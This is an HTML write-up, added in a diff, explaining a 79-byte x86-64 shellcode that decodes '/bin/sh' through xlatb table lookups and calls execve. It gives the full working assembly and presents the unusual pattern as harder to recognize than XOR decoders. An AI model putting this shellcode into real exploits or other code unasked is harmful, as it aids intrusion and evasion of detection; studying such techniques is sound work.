@@ -1,0 +1,328 @@
+<html>
+<head>
+<title>XLAT is All You Need ~ febnug</title>
+<meta charset="utf-8">
+<link href="./style.css" rel="stylesheet" type="text/css">
+<link rel="stylesheet" href="./highlight.min.css">
+<script src="./highlight.min.js"></script>
+<script src="./x86asm.min.js"></script>
+</head>
+<body>
+<div class="txtdiv">
+                                                       ┌───────────────────────┐
+                                                       ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄       │
+                                                       │ █   █ █ █ █   █       │
+                                                       │ █   █ █ █ █▀▀▀▀       │
+                                                       │ █   █   █ █     ▄     │
+                                                       │                 ▄▄▄▄▄ │
+                                                       │                 █   █ │
+                                                       │                 █   █ │
+                                                       │                 █▄▄▄█ │
+                                                       │                 ▄   ▄ │
+                                                       │                 █   █ │
+                                                       │                 █   █ │
+                                                       │                 █▄▄▄█ │
+                                                       │                 ▄▄▄▄▄ │
+                                                       │                   █   │
+XLAT is All You Need                                   │                   █   │
+~ febnug                                               └───────────────────█ ──┘
+
+[1. Introduction]
+
+Most shellcode decoders follow a familiar pattern: a small loop that applies a 
+simple transformation such as XOR or addition, reconstructing the original 
+payload byte by byte. These techniques are effective, but they are also 
+predictable and widely documented.
+
+This work explores a different approach by using the xlatb instruction as the 
+core decoding primitive, combined with a minimal lookup table and runtime 
+mutation. Instead of relying on arithmetic transformations, the shellcode 
+performs indirect lookups, shifting part of the decoding logic into data.
+
+The final payload fits within 79 bytes and remains fully position-independent. 
+Earlier iterations were slightly smaller but proved unstable due to incorrect 
+pointer resolution, especially when executed as raw shellcode. The final 
+version prioritizes reliability while maintaining tight size constraints.
+
+More importantly, this approach moves toward a data-driven model, where behavior
+is defined by table contents rather than explicit instruction sequences.
+
+
+[2. Why XLAT over XOR?]
+
+XOR-based decoders are the default choice in most shellcode. They are simple, 
+compact, and easy to implement, typically using a tight loop with a fixed key. 
+However, this also makes them predictable, both in structure and behavior.
+
+Using xlatb replaces arithmetic transformation with lookup-based
+decoding. Instead of computing:
+<pre><code class="language-txt">
+    decoded = encoded ^ key
+</code></pre>
+the shellcode performs:
+<pre><code class="language-txt">
+    decoded = table[index]
+</code></pre>
+where the index is taken directly from the payload.
+
+This introduces several differences:
+
+* The decoding logic is implicit and stored in data rather than instructions.
+
+* There is no fixed key. The mapping can be arbitrarily defined.
+
+* The instruction pattern is uncommon. xlatb is rarely seen in modern code, 
+  making the structure less recognizable.
+
+* Only a partial table is required, reducing overhead compared to a full 
+  256-byte lookup table.
+
+From a design perspective, XOR encodes behavior in instructions, whereas xlatb 
+encodes behavior in data. This distinction makes the approach more flexible, 
+even if not always smaller.
+
+
+[3. Design Overview]
+
+The shellcode consists of four main stages:
+
+1. Resolve pointers to payload and table
+2. Copy and mutate the lookup table
+3. Decode "/bin/sh" using xlatb
+4. Execute execve
+
+Constraints:
+
+* Position independent
+* Size-constrained (&lt;80 bytes)
+* No fragile control flow tricks
+* Safe self-modification (no writes to .text)
+
+
+[4. Pointer Resolution]
+
+A call/pop sequence is used to obtain the payload address:
+<pre><code class="language-x86asm">
+call decoder
+...
+decoder:
+    pop rsi
+</code></pre>
+Earlier versions relied on offset calculations such as:
+<pre><code class="language-x86asm">
+lea rbx, [rsi + table - payload]
+</code></pre>
+While this worked in a standalone ELF binary, it proved unreliable when executed 
+as raw shellcode. The layout assumptions did not always hold, leading to invalid 
+memory accesses and crashes.
+
+The final version resolves the table pointer using another call/pop sequence:
+<pre><code class="language-x86asm">
+call get_table
+get_table:
+	pop rbx
+</code></pre>
+By placing the call immediately before the table, RBX is guaranteed to point to 
+the correct location regardless of how the shellcode is loaded.
+
+This makes the implementation fully position-independent and robust across 
+different execution contexts.
+
+
+[5. Table Mutation]
+
+The lookup table is stored in encoded form:
+<pre><code class="language-txt">
+db value ^ 0x11
+</code></pre>
+At runtime, it is copied to the stack and decoded via XOR:
+<pre><code class="language-x86asm">
+mov rax, [rbx]
+mov [rsp-32], rax
+lea rbx, [rsp-32]
+
+mov cl, 7
+
+.mut:
+xor byte [rbx+rcx-1], 0x11
+loop .mut
+</code></pre>
+This avoids modifying the .text section, which would fail on systems with W^X 
+protections. The mutation step also introduces variation in memory without 
+increasing code complexity.
+
+
+[6. Decoding via XLAT]
+
+The payload is a sequence of indices rather than a string:
+<pre><code class="language-x86asm">
+db 0,1,2,3,0,4,5,6
+</code></pre>
+Each byte is used as an index into the table:
+<pre><code class="language-x86asm">
+lodsb
+xlatb
+stosb
+</code></pre>
+This reconstructs:
+<pre><code class="language-txt">
+/bin/sh
+</code></pre>
+The null terminator is written explicitly:
+<pre><code class="language-x86asm">
+xor eax, eax
+mov [rdi-1], al
+</code></pre>
+
+[7. Execution]
+
+Once the string is prepared on the stack:
+<pre><code class="language-x86asm">
+mov al, 59
+lea rdi, [rsp-16]
+xor esi, esi
+xor edx, edx
+syscall
+</code></pre>
+This invokes:
+<pre><code class="language-c">
+execve("/bin/sh", NULL, NULL)
+</code></pre>
+
+[8. Full Shellcode]
+
+<pre><code class="language-x86asm">
+BITS 64
+
+_start:
+    jmp short data
+
+decoder:
+    pop rsi
+
+    call get_table
+get_table:
+    pop rbx
+
+    mov rax, [rbx]
+    mov [rsp-32], rax
+    lea rbx, [rsp-32]
+
+    mov cl, 7
+.mut:
+    xor byte [rbx+rcx-1], 0x11
+    loop .mut
+
+    lea rdi, [rsp-16]
+    mov cl, 8
+
+.loop:
+    lodsb
+    xlatb
+    stosb
+    loop .loop
+
+    xor eax, eax
+    mov [rdi-1], al
+
+    mov al, 59
+    lea rdi, [rsp-16]
+    xor esi, esi
+    xor edx, edx
+    syscall
+
+data:
+    call decoder
+
+payload:
+    db 0,1,2,3,0,4,5,6
+
+    call get_table
+
+table:
+    db 0x2f ^ 0x11
+    db 0x62 ^ 0x11
+    db 0x69 ^ 0x11
+    db 0x6e ^ 0x11
+    db 0x73 ^ 0x11
+    db 0x68 ^ 0x11
+    db 0x01 ^ 0x11
+</code></pre>
+
+[9. Size and Properties]
+
+* Size: ~80 bytes
+* Position independent
+* Self-modifying via stack copy
+* Lookup-based decoding via xlatb
+* Partial lookup table
+
+The size can be verified as follows:
+<pre><code class="language-txt">
+febri@ubuntu:~/project/shellcode/xlat$ objcopy -O binary -j .text xlat shellcode.bin
+febri@ubuntu:~/project/shellcode/xlat$ wc -c shellcode.bin 
+79 shellcode.bin
+febri@ubuntu:~/project/shellcode/xlat$
+</code></pre>
+
+[10. Observations]
+
+This approach shifts the perspective from:
+
+"decode data using instructions"
+
+to:
+
+"execute behavior defined by data"
+
+The lookup table effectively acts as a small program, and xlatb becomes the 
+mechanism that executes it. While not a full virtual machine, it demonstrates 
+how behavior can be driven by data rather than explicit logic.
+
+The debugging process also highlights an important practical detail: techniques 
+that work in ELF binaries do not always translate directly to raw shellcode. 
+Position independence must account for how code is actually loaded and executed.
+
+
+[11. Conclusion]
+
+Using xlatb as a decoding primitive provides an alternative to traditional 
+shellcode techniques. Combined with a minimal lookup table and runtime mutation,
+it enables compact and flexible payloads that differ from common patterns.
+
+Although XOR-based approaches remain more efficient for simple cases, this 
+method offers a different trade-off, favoring structural variation and 
+data-driven behavior.
+
+The result is not just smaller shellcode, but a different way of thinking about 
+how shellcode can be constructed.
+
+
+[12. Future Work]
+
+* Polymorphic table generation
+* Multi-stage payloads
+* Lookup-driven control flow
+* Metamorphic instruction layouts
+
+
+[13. Final Thoughts]
+
+Sometimes the interesting part is not making shellcode smaller, but
+making it different.
+
+And xlatb is a surprisingly good place to start.
+
+
+[14. References]
+
+[1] Intel 64 and IA-32 Architectures Software Developer’s Manual
+
+[2] XLAT/XLATB Instruction
+    https://www.felixcloutier.com/x86/xlat:xlatb
+
+--[ <a href="5.html">PREV</a> | <a href="index.html">HOME</a> | <a href="7.html">NEXT</a> ]--
+
+</div>
+<script>hljs.highlightAll();</script>
+</body>
